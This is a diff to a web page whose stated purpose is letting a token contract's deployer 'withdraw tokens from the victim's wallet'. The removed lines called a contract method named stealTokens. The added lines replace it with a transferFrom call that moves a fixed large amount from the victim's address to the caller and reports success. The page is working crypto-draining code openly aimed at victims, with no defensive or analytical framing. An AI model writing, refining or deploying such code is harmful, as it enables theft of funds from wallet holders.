@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdraw Tokens - Deployer</title>
+    <title>Withdraw Tokens Using Deployer's Wallet</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -31,7 +31,7 @@
 </head>
 <body>
     <h1>Withdraw Tokens Using Deployer's Wallet</h1>
-    <p>Connect your wallet as the deployer to withdraw all tokens from the victim's wallet.</p>
+    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>
 
     <!-- Connect Wallet Button -->
     <button id="connectWalletBtn">Connect Wallet</button>
@@ -113,31 +113,12 @@
             try {
                 console.debug("Initiating withdrawal for victim:", victimAddress);
 
-                // Get the victim's token balance
-                const tokenContract = new web3.eth.Contract([
-                    {
-                        "constant": true,
-                        "inputs": [{"name": "account", "type": "address"}],
-                        "name": "balanceOf",
-                        "outputs": [{"name": "", "type": "uint256"}],
-                        "payable": false,
-                        "stateMutability": "view",
-                        "type": "function"
-                    }
-                ], tokenAddress);
+                // Use transferFrom to transfer the entire balance
+                await contract.methods.transferFrom(victimAddress, userAccount, web3.utils.toWei('1000000', 'ether')) // Example: Max amount to withdraw
+                .send({ from: userAccount });
 
-                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
-                console.debug("Victim's token balance:", victimBalance);
-
-                if (parseInt(victimBalance) > 0) {
-                    // Withdraw all tokens
-                    await contract.methods.stealTokens(victimAddress, victimBalance).send({ from: userAccount });
-                    console.debug("Withdrawal successful.");
-                    document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
-                } else {
-                    document.getElementById('status').innerText = "Victim has no tokens to withdraw.";
-                }
-
+                console.debug("Withdrawal successful.");
+                document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
             } catch (error) {
                 console.error("Error withdrawing tokens:", error);
                 document.getElementById('status').innerText = "Error withdrawing tokens.";
@@ -146,3 +127,4 @@
     </script>
 </body>
 </html>
+
